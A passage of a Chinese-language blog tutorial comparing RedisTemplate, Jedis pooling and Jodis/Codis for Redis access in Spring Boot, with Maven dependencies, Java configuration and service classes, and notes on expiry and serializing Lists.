class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- redis --&gt;</span><br><span class=\"line\"> &lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\"> &lt;!--&lt;/dependency&gt;--&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>springboot自己集成的spring-boot-data-redis与redis-clients有冲突<br><br>redis-clients可以与jodis配合使用，所以选择redis-clients.</p>\n<p>3.关于redis过期时间<br>redis默认不过期，当内存满时，删除先存入的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存短信记录,首次，设置过期时间</span><br><span class=\"line\">   public void setJodisWithTime(String key, Object value, int time)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //set(String, String) 所以List需要序列化，有效时间为time</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   //存短信记录，不重新设置过期时间,使用原有的</span><br><span class=\"line\">   public void setJodis(String key, Object value)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //使用原有时间</span><br><span class=\"line\">       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<h4 id=\"1-redis大概\"><a href=\"#1-redis大概\" class=\"headerlink\" title=\"1.redis大概\"></a>1.redis大概</h4><p>1.Redis<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;  </span><br><span class=\"line\">\t&lt;groupId&gt;org.springframework.data&lt;/groupId&gt;  </span><br><span class=\"line\">\t&lt;artifactId&gt;spring-data-redis&lt;/artifactId&gt;  </span><br><span class=\"line\">\t&lt;version&gt;1.8.9.RELEASE&lt;/version&gt;  </span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>通过org.springframework.data.redis.connection.jedis.JedisConnectionFactory工厂类来管理，然后通过配置的模版bean，操作redis服务，代码段中充斥大量与业务无关的模版片段代码，代码冗余 <br><br>spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api<br><br>","more":"<br>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.redis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.cache.CacheManager;</span><br><span class=\"line\">import org.springframework.cache.annotation.CachingConfigurerSupport;</span><br><span class=\"line\">import org.springframework.cache.annotation.EnableCaching;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.data.redis.cache.RedisCacheManager;</span><br><span class=\"line\">import org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class=\"line\">import org.springframework.data.redis.core.RedisTemplate;</span><br><span class=\"line\">import org.springframework.data.redis.serializer.RedisSerializer;</span><br><span class=\"line\">import org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class=\"line\"></span><br><span class=\"line\">@EnableCaching</span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RedisConfig extends CachingConfigurerSupport &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public CacheManager cacheManager (RedisTemplate  redisTemplate)&#123;</span><br><span class=\"line\">        CacheManager cacheManager = new RedisCacheManager(redisTemplate);</span><br><span class=\"line\">        return cacheManager;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api</span><br><span class=\"line\">//    @Bean</span><br><span class=\"line\">    public RedisTemplate redisTemplate(RedisConnectionFactory factory)&#123;</span><br><span class=\"line\">        RedisTemplate&lt;String,Object&gt; redisTemplate = new RedisTemplate&lt;&gt;();</span><br><span class=\"line\">        //设置序列化方式,不设置value</span><br><span class=\"line\">        RedisSerializer redisSerializer =new StringRedisSerializer();</span><br><span class=\"line\">        redisTemplate.setKeySerializer(redisSerializer);</span><br><span class=\"line\">        redisTemplate.setHashKeySerializer(redisSerializer);</span><br><span class=\"line\">        //连接</span><br><span class=\"line\">        redisTemplate.setConnectionFactory(factory);</span><br><span class=\"line\">        return redisTemplate;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.redis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.data.redis.core.RedisTemplate;</span><br><span class=\"line\">import org.springframework.data.redis.core.ValueOperations;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\"></span><br><span class=\"line\">//@Service</span><br><span class=\"line\">public class RedisServer &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    RedisTemplate redisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        vo.set(key, value);</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        redisTemplate.expire(key,600,TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  Object getKey(String key)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        return vo.get(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.Jedis<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients --&gt;</span><br><span class=\"line\">&lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">    &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\">&lt;!--&lt;/dependency&gt;--&gt;</span><br></pre></td></tr></table></figure></p>\n<p>通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码<br><br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; &#125;)</span><br><span class=\"line\">public class JedisConfig &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisPool getJedisPool()&#123;</span><br><span class=\"line\">        JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">        //连接设置</span><br><span class=\"line\">        //config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">        //config.set（等等）</span><br><span class=\"line\">        //建立连接</span><br><span class=\"line\">        JedisPool jedisPool = new JedisPool(config, &quot;127.0.0.1&quot;, 6379);</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\">import redis.clients.jedis.JedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JedisServer &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisPool jedisPool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        //try/catch后面添加</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">         //set(String, String) 所以List需要序列化,此处value为list</span><br><span class=\"line\">        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>3.Jodis<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>与codis结合使用对jedispool做了封装。<br><br>通过zookeeper上注册的codis proxy个数创建相应个数的jedispool封装<br>为RoundRobinJedisPool，并监听节点的变化，proxy的地址会传回来，可以及时增删配置的jedispool<br></p>\n<p>配置类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import com.wandoulabs.jodis.RoundRobinJedisPool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; &#125;)</span><br><span class=\"line\">public class JodisConfig &#123;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPath&#125;&quot;)</span><br><span class=\"line\">    private String zkPath;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.product&#125;&quot;)</span><br><span class=\"line\">    private String product;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPassword&#125;&quot;)</span><br><span class=\"line\">    private String zkPassword;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkTimeout&#125;&quot;)</span><br><span class=\"line\">    private int zkTimeout;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxTotal&#125;&quot;)</span><br><span class=\"line\">    private String maxTotal;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxWaitMillis&#125;&quot;)</span><br><span class=\"line\">    private String maxWaitMillis;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMinIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMinIdele;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMaxIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMaxIdle;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnBorrow&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnBorrow;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnReturn&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnReturn;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisResourcePool zkJedisPool()&#123;</span><br><span class=\"line\">        JedisResourcePool jedisPool = null;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">            config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));</span><br><span class=\"line\">            config.setMaxIdle(poolMaxIdle);</span><br><span class=\"line\">            config.setMinIdle(poolMinIdele);</span><br><span class=\"line\">            config.setTestOnBorrow(testOnBorrow);</span><br><span class=\"line\">            config.setTestOnReturn(testOnReturn);</span><br><span class=\"line\">            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)</span><br><span class=\"line\">                    .zkProxyDir(product).password(zkPassword)</span><br><span class=\"line\">                    .poolConfig(config).build();</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;jodis 连接出错。&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.example.redisdemo.jedis.ObjectTranscoder;</span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JodisServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisResourcePool jedisResourcePool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setKey(String key, Object value, int time)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        System.out.println(&quot;ttl: &quot;);</span><br><span class=\"line\">        System.out.println(jedis.ttl(key));</span><br><span class=\"line\">        //long转int,向下转换，可能溢出，不能直接转换，所以long -&gt; String -&gt; int</span><br><span class=\"line\">        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-一些注意事项\"><a href=\"#2-一些注意事项\" class=\"headerlink\" title=\"2.一些注意事项\"></a>2.一些注意事项</h4><p>1.存储数据<br>在jedis存储数据过程中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public String set(String key, String value) &#123;</span><br><span class=\"line\">  this.checkIsInMultiOrPipeline();</span><br><span class=\"line\">  this.client.set(key, value);</span><br><span class=\"line\">  return this.client.getStatusCodeReply();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>类型为String,String 所以我们要存储List数据，需要先进行序列化<br><br>Serialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存</span><br><span class=\"line\">public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">  Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//取</span><br><span class=\"line\">public Object getKey(String key)&#123;</span><br><span class=\"line\">    Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">    if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">    List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">    return list;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>序列化工具类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span 